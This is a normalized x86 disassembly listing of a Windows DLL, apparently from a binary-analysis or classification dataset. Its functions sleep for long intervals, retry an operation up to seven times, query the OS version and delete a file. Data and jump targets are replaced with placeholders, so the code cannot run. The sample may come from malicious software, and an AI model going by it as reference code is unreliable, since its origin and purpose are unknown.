push 0x1
lea ecx [ esi + 0xbc ]
call sub_10002597
lea edi [ esi + 0x34 ]
call sub_10002634
push 0x0
push 0x1
lea ecx [ esi + 0x18 ]
call sub_10002597
mov ecx esi
mov [ esi ] r--data
call sub_100132ab
call sub_10023f0b
retn
sub_10008057
push 0x64
mov eax sub_1004979f
call sub_10023e9c
mov eax [ ecx + 0x14 ]
mov esi edx
cmp eax [ esi + 0x14 ]
jae r-xdata
mov edx [ esi + 0x14 ]
push edx
sub eax edx
push eax
lea eax [ ebp - 0x2c ]
push eax
call sub_1000925c
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
call sub_1000710a
push eax
mov eax esi
lea ecx [ ebp - 0x6c ]
mov [ ebp - 0x4 ] 0x1
call sub_100095ed
pop ecx
mov esi eax
lea ecx [ ebp - 0x30 ]
call sub_1000710a
push eax
lea eax [ ebp - 0x2c ]
lea ecx [ ebp - 0x50 ]
mov [ ebp - 0x4 ] 0x3
call sub_100095ed
pop ecx
mov ecx eax
mov eax esi
mov [ ebp - 0x4 ] 0x4
call sub_10006bb3
push 0x0
push 0x1
lea ecx [ ebp - 0x50 ]
mov bl al
call sub_10002597
lea ecx [ ebp - 0x30 ]
call sub_10007b41
push 0x0
push 0x1
lea ecx [ ebp - 0x6c ]
call sub_10002597
lea ecx [ ebp - 0x34 ]
call sub_10007b41
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10002597
mov al bl
xor al al
jmp r-xdata
call sub_10023f1f
retn
sub_1000813a
cmp [ ebp - 0x31 ] 0x0
je r-xdata
call sub_10023f2e
retn
lea eax [ ebp - 0x30 ]
call sub_10008042
lea edx [ esi + 0x4c ]
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x2
call sub_10008057
mov ecx esi
test al al
je r-xdata
call sub_1000868b
push 0x0
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_10002597
call sub_1000870a
sub_1000817c
push 0x268
mov eax sub_1004a4f8
call sub_10023e9c
call sub_100120ff
mov [ ebp - 0x248 ] r--data
mov [ ebp - 0x244 ] eax
mov [ ebp - 0x248 ] r--data
lea eax [ ebp - 0x248 ]
xor esi esi
push eax
lea edi [ ebp - 0x240 ]
mov [ ebp - 0x4 ] esi
call sub_1001217f
test al al
jne r-xdata
lea eax [ ebp - 0x21c ]
push eax
lea ecx [ ebp - 0x274 ]
call sub_100012f3
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x1
mov ebx [ edi + 0xc ]
lea esi [ ebp - 0x250 ]
call sub_10001909
lea ecx [ ebp - 0x248 ]
mov [ ebp - 0x248 ] r--data
call sub_100132ab
mov eax esi
call sub_10023f1f
retn
call sub_1002059f
cmp eax [ ebp - 0x258 ]
je r-xdata
xor bl bl
lea esi [ ebp - 0x250 ]
call sub_100092a6
mov edx eax
lea ecx [ ebp - 0x274 ]
call sub_10008057
mov bl 0x1
cmp al bl
je r-xdata
mov eax [ ebp - 0x24c ]
cmp eax [ ebp - 0x254 ]
je r-xdata
mov esi [ ebp - 0x238 ]
jmp r-xdata
lea eax [ ebp - 0x248 ]
push eax
lea edi [ ebp - 0x240 ]
call sub_1001222a
test al al
jne r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x274 ]
mov [ ebp - 0x4 ] 0x0
call sub_10002597
test bl bl
jne r-xdata
call sub_1000359d
jmp r-xdata
xor esi esi
jmp r-xdata
mov edi [ ebp + 0x8 ]
mov ebx [ edi + 0x10 ]
lea esi [ ebp - 0x258 ]
call sub_10001909
mov eax [ ebp - 0x250 ]
test eax eax
je r-xdata
sub_100082a9
push ebp
sub esp 0xb4
lea ebp [ esp - 0x4 ]
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0xb4 ] eax
push 0x1b8
mov eax sub_1004af9e
call sub_10023e66
push r--data
lea ecx [ ebp + 0x7c ]
call sub_100012f3
xor esi esi
push r--data
lea ecx [ ebp ]
mov [ ebp - 0x4 ] esi
call sub_100012f3
lea eax [ ebp - 0xb4 ]
push eax
mov [ ebp - 0x4 ] 0x1
call sub_10008df2
lea ecx [ ebp ]
push ecx
push eax
lea eax [ ebp - 0x98 ]
push eax
mov [ ebp - 0x4 ] 0x2
call sub_10009607
push r--data
push eax
lea eax [ ebp + 0x60 ]
push eax
mov [ ebp - 0x4 ] 0x3
call sub_10009652
add esp 0x1c
push esi
push 0x1
lea ecx [ ebp - 0x98 ]
call sub_10002597
push esi
push 0x1
lea ecx [ ebp - 0xb4 ]
call sub_10002597
push __dos_header
lea ebx [ ebp + 0x98 ]
mov [ ebp - 0x4 ] 0x7
call sub_10012023
pop ecx
lea eax [ ebp + 0x60 ]
mov ecx ebx
mov [ ebp - 0x4 ] 0x8
call sub_10006bb3
xor ebx ebx
cmp al bl
jne r-xdata
push ebx
push 0x1
lea ecx [ ebp + 0x98 ]
call sub_10002597
mov [ ebp - 0x4 ] 0x6
jmp r-xdata
lea eax [ ebp + 0x60 ]
push eax
lea ecx [ ebp + 0x98 ]
call sub_100122d5
pop ecx
lea eax [ ebp - 0x1c4 ]
push eax
call sub_10002f36
push r--data
lea eax [ ebp + 0x60 ]
push eax
lea eax [ ebp - 0x1bc ]
push r--data
push eax
mov [ ebp - 0x4 ] 0xa
call sub_10009699
pop ecx
pop ecx
push eax
call sub_10005f0c
pop ecx
pop ecx
push eax
call sub_10009699
push eax
call sub_100097f2
add esp 0xc
push r--data
lea ecx [ ebp - 0x7c ]
mov [ ebp - 0x11 ] 0x1
call sub_100012f3
push r--data
lea ecx [ ebp - 0x60 ]
mov [ ebp - 0x4 ] 0xb
call sub_100012f3
lea eax [ ebp - 0x7c ]
push eax
lea eax [ ebp - 0x60 ]
push eax
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x4 ] 0xc
call sub_10011694
xor esi esi
push ebx
inc esi
push esi
lea ecx [ ebp - 0x60 ]
call sub_10002597
push ebx
push esi
lea ecx [ ebp - 0x7c ]
call sub_10002597
lea eax [ ebp + 0x7c ]
push eax
lea eax [ ebp - 0x24 ]
push eax
mov [ ebp - 0x4 ] 0x10
call sub_10011a90
cmp al 0x1
jne r-xdata
mov [ ebp - 0x4 ] 0xf
jmp r-xdata
lea eax [ ebp + 0x7c ]
push eax
lea eax [ ebp + 0x38 ]
push eax
lea eax [ ebp - 0x24 ]
push eax
call sub_100117b2
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp + 0x38 ]
push eax
mov [ ebp - 0x4 ] 0x11
call sub_10011c16
push eax
lea eax [ ebp + 0x98 ]
push eax
mov [ ebp - 0x4 ] 0x12
call sub_10008e56
pop ecx
pop ecx
push ebx
push esi
lea ecx [ ebp - 0x44 ]
mov [ ebp - 0x4 ] 0x14
call sub_10002597
push r--data
lea ecx [ ebp + 0x1c ]
call sub_100012f3
mov [ ebp - 0x4 ] 0x15
mov ecx [ ebp + 0x30 ]
cmp ecx [ ebp + 0xac ]
jbe r-xdata
cmp [ ebp - 0x11 ] 0x1
jne r-xdata
jae r-xdata
mov [ ebp - 0x11 ] 0x1
jmp r-xdata
mov [ ebp - 0x18 ] ebx
lea ecx [ ebp - 0x44 ]
lea eax [ ebp - 0x1c4 ]
call sub_10003065
lea ecx [ ebp + 0x7c ]
push ecx
lea ecx [ ebp + 0x38 ]
push ecx
mov edi eax
mov [ ebp - 0x4 ] 0x17
call sub_10011c97
pop ecx
pop ecx
push ebx
push 0x1
lea ecx [ ebp - 0x44 ]
mov [ ebp - 0x4 ] 0x19
call sub_10002597
lea eax [ ebp - 0x24 ]
push eax
lea ecx [ ebp + 0x38 ]
call sub_10011a0b
lea esi [ ebp + 0x38 ]
mov [ ebp - 0x4 ] 0xf
call sub_10011bce
cmp [ ebp + 0xb0 ] 0x8
mov eax [ ebp + 0x9c ]
jae r-xdata
mov [ ebp - 0x11 ] bl
jmp r-xdata
push ebx
push esi
lea ecx [ ebp + 0x1c ]
call sub_10002597
push ebx
push esi
lea ecx [ ebp + 0x98 ]
call sub_10002597
lea esi [ ebp + 0x38 ]
mov [ ebp - 0x4 ] 0x10
call sub_10011bce
lea ecx [ ebp - 0x24 ]
call sub_10011795
lea eax [ ebp - 0x1c4 ]
mov [ ebp - 0x4 ] 0x6
call sub_10002709
push ebx
push 0x1
lea ecx [ ebp + 0x60 ]
call sub_10002597
push ebx
push 0x1
lea ecx [ ebp ]
call sub_10002597
push ebx
push 0x1
lea ecx [ ebp + 0x7c ]
call sub_10002597
mov al [ ebp - 0x11 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp + 0xb4 ]
xor ecx ebp
call sub_10020040
add ebp 0xb8
leave
retn
lea eax [ ebp - 0x13c ]
push eax
mov [ ebp - 0x4 ] 0x1a
call sub_10002f36
lea eax [ ebp + 0x7c ]
push eax
lea eax [ ebp - 0x134 ]
push eax
mov [ ebp - 0x4 ] 0x1b
call sub_10005f0c
pop ecx
pop ecx
lea eax [ ebp - 0x134 ]
push eax
call sub_100099a3
cmp [ ebp - 0x18 ] ebx
pop ecx
jle r-xdata
push [ ebp + 0xac ]
push eax
push ecx
push ebx
lea ecx [ ebp + 0x1c ]
call sub_10006c07
cmp eax ebx
setge [ ebp - 0x11 ]
lea eax [ ebp + 0x9c ]
lea ecx [ ebp - 0x44 ]
lea eax [ ebp - 0x13c ]
call sub_10003065
push eax
lea eax [ ebp - 0x24 ]
push eax
mov [ ebp - 0x4 ] 0x1c
call sub_10011b0e
push ebx
push 0x1
lea ecx [ ebp - 0x44 ]
call sub_10002597
lea eax [ ebp - 0x13c ]
mov [ ebp - 0x4 ] 0x1a
call sub_10002709
mov [ ebp - 0x4 ] 0xf
jmp r-xdata
push [ ebp - 0x18 ]
lea eax [ ebp - 0x134 ]
push eax
call sub_10008f9b
inc [ ebp - 0x18 ]
jmp r-xdata
cmp [ ebp - 0x18 ] 0x7
jge r-xdata
sub_1000868b
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004aee1
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1c
push ebx
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x28 ]
mov [ fs : 0x0 ] eax
mov esi ecx
lea eax [ esp + 0xc ]
push eax
call sub_1000b385
and [ esp + 0x30 ] 0x0
lea eax [ esi + 0x4c ]
push eax
lea eax [ esp + 0x10 ]
call sub_100013d4
lea eax [ esp + 0xc ]
push eax
lea ebx [ esi + 0xd8 ]
call sub_10008af2
pop ecx
lea esi [ esp + 0xc ]
call sub_10001508
push [ esp + 0xc ]
call sub_1002004f
pop ecx
mov ecx [ esp + 0x28 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_1000870a
push 0x6c
mov eax sub_1004b1c5
call sub_10023ed2
mov edi ecx
lea eax [ edi + 0x18 ]
push eax
lea eax [ ebp - 0x78 ]
push eax
mov [ ebp - 0x40 ] edi
call sub_10008b68
pop ecx
pop ecx
push 0xffffffff
xor ebx ebx
push ebx
push eax
lea ecx [ edi + 0xbc ]
mov [ ebp - 0x4 ] ebx
call sub_10002033
or [ ebp - 0x4 ] 0xffffffff
xor esi esi
push ebx
inc esi
push esi
lea ecx [ ebp - 0x78 ]
call sub_10002597
lea ecx [ edi + 0xd8 ]
mov eax [ ecx ]
call [ eax + 0x4 ]
push 0xfa0
call [ Sleep@IAT ]
lea eax [ edi + 0x6c ]
mov [ ebp - 0x4 ] esi
push eax
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x34 ] r--data
call sub_10001daa
lea eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x34 ]
push eax
mov [ ebp - 0x4 ] 0x2
call sub_1000bf0c
mov [ ebp - 0x4 ] 0x3
mov esi [ ebp - 0x4c ]
cmp esi [ ebp - 0x48 ]
jbe r-xdata
mov eax [ ebp - 0x58 ]
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x38 ] esi
call sub_1002059f
mov eax [ ebp - 0x3c ]
cmp eax ebx
je r-xdata
call sub_1002059f
call sub_1002059f
cmp eax [ ebp - 0x58 ]
je r-xdata
lea eax [ ebp - 0x58 ]
push eax
mov [ ebp - 0x4 ] 0x2
call sub_1000927e
lea ecx [ ebp - 0x34 ]
call sub_1000b816
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
lea esi [ ebp - 0x3c ]
call sub_100092a6
cmp [ eax ] ebx
je r-xdata
cmp [ ebp - 0x38 ] esi
je r-xdata
push edi
call sub_10008a48
lea esi [ ebp - 0x3c ]
call sub_100092ce
jmp r-xdata
call sub_100092a6
mov edx [ eax ]
push ecx
push ecx
mov ecx esp
add eax 0x4
mov [ ebp - 0x5c ] esp
mov [ ecx ] edx
push eax
add ecx 0x4
call sub_1000ad88
lea esi [ edi + 0xfc ]
call sub_1000b239
mov esi [ ebp - 0x48 ]
cmp [ ebp - 0x4c ] esi
jbe r-xdata
sub_10008835
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004aeab
mov eax [ fs : 0x0 ]
push eax
sub esp 0x108
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x100 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x118 ]
mov [ fs : 0x0 ] eax
lea edi [ esp + 0x18 ]
mov esi ecx
call sub_1000db54
xor ebx ebx
mov [ esp + 0x120 ] ebx
push ebx
lea ecx [ esp + 0x44 ]
mov [ esp + 0x5c ] 0xf
call sub_10002493
mov [ esp + 0x120 ] 0x1
mov ecx [ esp + 0x18 ]
cmp ecx ebx
je r-xdata
lea eax [ esi + 0x6c ]
push eax
lea ecx [ esp + 0x64 ]
mov [ esp + 0x60 ] r--data
call sub_10001daa
lea eax [ esi + 0xbc ]
push eax
lea eax [ esp + 0x80 ]
lea ecx [ esi + 0x34 ]
push eax
mov [ esp + 0x128 ] 0x3
call sub_1000ef19
lea eax [ esp + 0x40 ]
push eax
lea eax [ esp + 0x80 ]
push eax
lea ebx [ esp + 0x18 ]
lea edi [ esp + 0x64 ]
mov [ esp + 0x128 ] 0x4
call sub_1000b8bb
mov [ esp + 0x120 ] 0x5
mov ecx [ esp + 0x10 ]
test ecx ecx
je r-xdata
lea edi [ esp + 0x24 ]
call sub_1000dd50
push 0xffffffff
push ebx
push eax
lea ecx [ esp + 0x4c ]
mov [ esp + 0x12c ] 0x2
call sub_100021b2
push ebx
push 0x1
mov ecx edi
mov [ esp + 0x128 ] 0x1
call sub_100023ce
mov eax [ esp + 0x18 ]
xor esi esi
cmp eax esi
je r-xdata
push ecx
push ecx
mov eax esp
mov [ eax ] ecx
lea ecx [ esp + 0x1c ]
mov [ esp + 0x28 ] esp
push ecx
lea ecx [ eax + 0x4 ]
call sub_1000ad88
add esi 0xfc
call sub_1000b239
cmp [ esp + 0x10 ] esi
jne r-xdata
cmp [ eax + 0x1c ] 0x8
jb r-xdata
mov [ esp + 0x120 ] 0x4
mov ecx [ esp + 0x14 ]
cmp ecx esi
je r-xdata
mov [ esp + 0x120 ] 0x4
mov ecx [ esp + 0x14 ]
cmp ecx esi
je r-xdata
add eax 0x8
mov eax [ eax + 0x8 ]
jmp r-xdata
lea ecx [ esp + 0x7c ]
call sub_1000efa8
lea ecx [ esp + 0x5c ]
call sub_1000b816
push esi
push 0x1
lea ecx [ esp + 0x48 ]
call sub_100023ce
or [ esp + 0x120 ] 0xffffffff
mov ecx [ esp + 0x1c ]
cmp ecx esi
je r-xdata
call sub_1000ad5c
lea ecx [ esp + 0x7c ]
call sub_1000efa8
lea ecx [ esp + 0x5c ]
call sub_1000b816
push esi
push 0x1
lea ecx [ esp + 0x48 ]
call sub_100023ce
or [ esp + 0x120 ] 0xffffffff
mov ecx [ esp + 0x1c ]
cmp ecx esi
je r-xdata
call sub_1000ad5c
push eax
call [ DeleteFileW@IAT ]
cmp [ esp + 0x18 ] esi
jne r-xdata
mov al 0x1
call sub_1000ad5c
xor al al
jmp r-xdata
call sub_1000ad5c
mov ecx [ esp + 0x118 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x100 ]
xor ecx esp
call sub_10020040
mov esp ebp
pop ebp
retn
sub_10008a48
push 0x1c
mov eax sub_1004b190
call sub_10023e66
mov esi [ ebp + 0x8 ]
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push 0x2bf20
call [ Sleep@IAT ]
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
lea eax [ ebp - 0x20 ]
push eax
call sub_100092f9
pop ecx
lea ebx [ esi + 0x34 ]
lea eax [ esi + 0x34 ]
push eax
call sub_10002a92
and [ ebp - 0x4 ] 0x0
mov ecx esi
call sub_10008835
cmp al 0x1
jne r-xdata
mov edi 0x3e8
push edi
call [ Sleep@IAT ]
lea eax [ ebp - 0x28 ]
push eax
call sub_100092f9
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x20 ]
lea ecx [ ebp - 0x28 ]
call sub_10009443
pop ecx
pop ecx
push ebx
call sub_10002a92
push 0x0
push edi
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
call sub_100274c0
mov ecx [ esi + 0x68 ]
xor edi edi
cmp edx edi
jl r-xdata
jg r-xdata
cmp eax ecx
jb r-xdata
jmp r-xdata
sub_10008af2
push 0x8
mov eax sub_1004ae4e
call sub_10023e33
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x8 ]
test al al
jne r-xdata
call sub_10023f0b
retn
mov esi [ Sleep@IAT ]
mov [ ebp - 0x14 ] r--data
mov edi 0x7d0
jmp r-xdata
push [ ebp + 0x8 ]
call sub_1000817c
pop ecx
mov [ ebp - 0x10 ] eax
push edi
test eax eax
je r-xdata
call esi
call esi
push [ ebp - 0x10 ]
and [ ebp - 0x4 ] 0x0
call sub_1001006a
push edi
call esi
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x8 ]
test al al
jne r-xdata
push 0x1b7740
call esi
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x8 ]
test al al
je r-xdata
sub_10008b68
push ebp
sub esp 0x6c
lea ebp [ esp - 0x4 ]
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x6c ] eax
push 0xfc
mov eax sub_1004ae1e
call sub_10023e66
mov eax [ ebp + 0x78 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x7c ]
xor ebx ebx
push r--data
lea ecx [ ebp - 0x80 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] ebx
call sub_100012f3
xor edi edi
inc edi
push r--data
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x4 ] edi
call sub_100012f3
lea eax [ ebp - 0x80 ]
push eax
lea eax [ ebp - 0x64 ]
push eax
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x4 ] 0x2
call sub_10011694
push ebx
push edi
lea ecx [ ebp - 0x64 ]
call sub_10002597
push ebx
push edi
lea ecx [ ebp - 0x80 ]
mov [ ebp - 0x4 ] 0x5
call sub_10002597
lea eax [ ebp - 0x108 ]
push eax
call sub_10002f36
push r--data
lea ecx [ ebp - 0x44 ]
mov [ ebp - 0x4 ] 0x7
call sub_100012f3
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp + 0x28 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov [ ebp - 0x4 ] 0x8
call sub_100117b2
push ebx
push edi
lea ecx [ ebp - 0x44 ]
mov [ ebp - 0x4 ] 0xa
call sub_10002597
lea eax [ ebp + 0x50 ]
push eax
lea eax [ ebp + 0x28 ]
push eax
call sub_10011c16
lea eax [ ebp + 0x50 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov [ ebp - 0x4 ] 0xb
call sub_10005f0c
pop ecx
pop ecx
push ebx
push edi
lea ecx [ ebp + 0x50 ]
call sub_10002597
lea esi [ ebp + 0x28 ]
mov [ ebp - 0x4 ] 0x7
call sub_10011bce
mov [ ebp - 0x4 ] 0x6
jmp r-xdata
call [ GetVersion@IAT ]
push eax
push r--data
lea eax [ ebp - 0x100 ]
push r--data
push eax
call sub_10009699
pop ecx
pop ecx
push eax
call sub_10009699
pop ecx
pop ecx
push eax
call sub_10009086
mov ecx [ ebp - 0x14 ]
lea eax [ ebp - 0x108 ]
call sub_10003065
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x4 ] 0x5
call sub_10002709
lea ecx [ ebp - 0x28 ]
call sub_10011795
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp + 0x6c ]
xor ecx ebp
call sub_10020040
add ebp 0x70
leave
retn
sub_10008c6b
mov eax [ ebp - 0x48 ]
cmp [ eax + 0x28 ] 0x2
je r-xdata
mov eax [ ebp - 0x108 ]
mov eax [ eax + 0x4 ]
lea eax [ ebp + eax - 0x108 ]
mov ecx [ eax + 0x28 ]
neg ecx
sbb ecx ecx
xor ebx ebx
and ecx 0xfffffffc
push ebx
add ecx 0x4
push eax
call sub_10007d13
lea eax [ ebp - 0x38 ]
push eax
call sub_10013244
mov esi eax
lea edi [ ebp + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop ecx
push [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
push r--data
movsd [ edi ] [ esi ]
lea eax [ ebp + 0x64 ]
push eax
mov eax [ ebp + 0x60 ]
shr eax 0x10
push eax
push [ ebp + 0x60 ]
lea eax [ ebp - 0x100 ]
push [ ebp + 0x5c ]
push eax
call sub_10009086
push eax
call sub_10008ea9
push eax
call sub_10008ea9
push eax
call sub_10009171
push eax
call sub_10009699
pop ecx
pop ecx
push eax
call sub_10005f0c
pop ecx
pop ecx
lea ecx [ ebp + 0x34 ]
lea eax [ ebp - 0x108 ]
call sub_10003065
push r--data
lea ecx [ ebp - 0x44 ]
mov [ ebp - 0x4 ] 0xd
call sub_100012f3
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp ]
push eax
lea edi [ ebp + 0x34 ]
mov [ ebp - 0x4 ] 0xe
call sub_10011c97
pop ecx
pop ecx
xor edi edi
push ebx
inc edi
push edi
lea ecx [ ebp - 0x44 ]
mov [ ebp - 0x4 ] 0x10
call sub_10002597
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ ebp ]
call sub_10011a0b
mov [ ebp - 0x4 ] 0xd
lea esi [ ebp ]
call sub_10011bce
push ebx
push edi
lea ecx [ ebp + 0x34 ]
call sub_10002597
mov [ ebp - 0x4 ] 0x6
mov eax r-xdata
retn
xor ebx ebx
push ebx
push ebx
call sub_10023a01
sub_10008df2
push 0x3c
mov eax sub_1004a0a7
call sub_10023e33
and [ ebp - 0x10 ] 0x0
push r--data
lea ecx [ ebp - 0x2c ]
call sub_100012f3
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x48 ]
push eax
lea ebx [ ebp - 0x2c ]
call sub_10012344
mov [ ebp - 0x4 ] 0x1
mov [ esp ] r--data
push eax
push [ ebp + 0x8 ]
call sub_10009652
add esp 0xc
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_10002597
push 0x0
push 0x1
mov ecx ebx
call sub_10002597
mov eax [ ebp + 0x8 ]
call sub_10023f0b
retn
sub_10008e56
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0xc ]
push esi
push 0x1
push 0xffffffff
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0x4 ] 0x30
call sub_100093b2
mov ecx [ ebp + 0xc ]
push 0x1
mov esi eax
push 0xffffffff
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0x4 ] 0x2c
call sub_100093b2
push 0xfffffffc
pop ecx
sub ecx esi
add eax ecx
mov ecx [ ebp + 0xc ]
push eax
push esi
push [ ebp + 0x8 ]
call sub_1000925c
mov eax [ ebp + 0x8 ]
pop esi
leave
retn
sub_10008ea9
push 0x20
mov eax sub_1004ad97
call sub_10023e66
mov edi [ ebp + 0x8 ]
lea eax [ ebp - 0x24 ]
xor ebx ebx
push eax
mov [ ebp - 0x14 ] ebx
call sub_1000ee8f
mov [ ebp - 0x4 ] ebx
cmp [ ebp - 0x20 ] bl
je r-xdata
mov eax [ edi ]
mov edx [ eax + 0x4 ]
add edx edi
cmp [ ebp - 0x14 ] ebx
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
add ecx edi
call sub_10007b59
push eax
mov [ ebp - 0x4 ] 0x1
call sub_1000621a
pop ecx
lea ecx [ ebp - 0x18 ]
mov esi eax
call sub_10007b41
mov [ ebp - 0x4 ] 0x2
mov ecx [ edi ]
mov eax [ ecx + 0x4 ]
mov ecx [ ecx + 0x4 ]
add ecx edi
movzx edx [ ecx + 0x30 ]
mov ecx [ ecx + 0x28 ]
mov [ ebp - 0x1c ] ecx
movzx ecx [ ebp + 0xc ]
push ecx
push edx
add eax edi
push eax
push [ ebp - 0x1c ]
mov [ ebp - 0x2c ] bl
push [ ebp - 0x2c ]
mov ebx [ esi ]
lea eax [ ebp - 0x2c ]
push eax
mov ecx esi
call [ ebx + 0x18 ]
xor ebx ebx
cmp [ ebp - 0x2c ] bl
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x24 ]
push eax
call sub_10007c4c
mov eax edi
call sub_10023f0b
retn 0x8
push ebx
push [ ebp - 0x14 ]
call sub_10007e2d
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov [ ebp - 0x14 ] 0x4
sub_10008f3f
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
add eax ecx
mov ecx [ eax + 0x8 ]
or ecx 0x4
cmp [ eax + 0x28 ] 0x0
jne r-xdata
push 0x1
push eax
call sub_10007d13
and [ ebp - 0x4 ] 0x0
mov eax r-xdata
retn
or ecx 0x4
sub_10008f9b
push 0x1c
mov eax sub_1004ad6a
call sub_10023e66
mov edi [ ebp + 0x8 ]
lea eax [ ebp - 0x20 ]
xor ebx ebx
push eax
mov [ ebp - 0x14 ] ebx
call sub_1000ee8f
mov [ ebp - 0x4 ] ebx
cmp [ ebp - 0x1c ] bl
je r-xdata
mov eax [ edi ]
mov edx [ eax + 0x4 ]
add edx edi
cmp [ ebp - 0x14 ] ebx
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
add ecx edi
call sub_10007b59
push eax
mov [ ebp - 0x4 ] 0x1
call sub_1000621a
pop ecx
lea ecx [ ebp - 0x18 ]
mov esi eax
call sub_10007b41
mov ecx [ edi ]
push [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0x2
mov eax [ ecx + 0x4 ]
mov ecx [ ecx + 0x4 ]
add ecx edi
movzx edx [ ecx + 0x30 ]
mov ecx [ ecx + 0x28 ]
push edx
add eax edi
push eax
push ecx
mov [ ebp - 0x28 ] bl
push [ ebp - 0x28 ]
mov ebx [ esi ]
lea eax [ ebp - 0x28 ]
push eax
mov ecx esi
call [ ebx + 0x1c ]
xor ebx ebx
cmp [ ebp - 0x28 ] bl
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x20 ]
push eax
call sub_10007c4c
mov eax edi
call sub_10023f0b
retn 0x8
push ebx
push [ ebp - 0x14 ]
call sub_10007e2d
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov [ ebp - 0x14 ] 0x4
sub_1000902a
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
add eax ecx
mov ecx [ eax + 0x8 ]
or ecx 0x4
cmp [ eax + 0x28 ] 0x0
jne r-xdata
push 0x1
push eax
call sub_10007d13
and [ ebp - 0x4 ] 0x0
mov eax r-xdata
retn
or ecx 0x4
sub_10009086
push 0x1c
mov eax sub_1004ad3d
call sub_10023e66
mov edi [ ebp + 0x8 ]
lea eax [ ebp - 0x20 ]
xor ebx ebx
push eax
mov [ ebp - 0x14 ] ebx
call sub_1000ee8f
mov [ ebp - 0x4 ] ebx
cmp [ ebp - 0x1c ] bl
je r-xdata
mov eax [ edi ]
mov edx [ eax + 0x4 ]
add edx edi
cmp [ ebp - 0x14 ] ebx
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
add ecx edi
call sub_10007b59
push eax
mov [ ebp - 0x4 ] 0x1
call sub_1000621a
pop ecx
lea ecx [ ebp - 0x18 ]
mov esi eax
call sub_10007b41
push [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0x2
mov ecx [ edi ]
mov eax [ ecx + 0x4 ]
mov ecx [ ecx + 0x4 ]
add ecx edi
movzx edx [ ecx + 0x30 ]
mov ecx [ ecx + 0x28 ]
push edx
add eax edi
push eax
push ecx
mov [ ebp - 0x28 ] bl
push [ ebp - 0x28 ]
mov ebx [ esi ]
lea eax [ ebp - 0x28 ]
push eax
mov ecx esi
call [ ebx + 0x18 ]
xor ebx ebx
cmp [ ebp - 0x28 ] bl
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x20 ]
push eax
call sub_10007c4c
mov eax edi
call sub_10023f0b
retn 0x8
push ebx
push [ ebp - 0x14 ]
call sub_10007e2d
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov [ ebp - 0x14 ] 0x4
sub_10009115
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
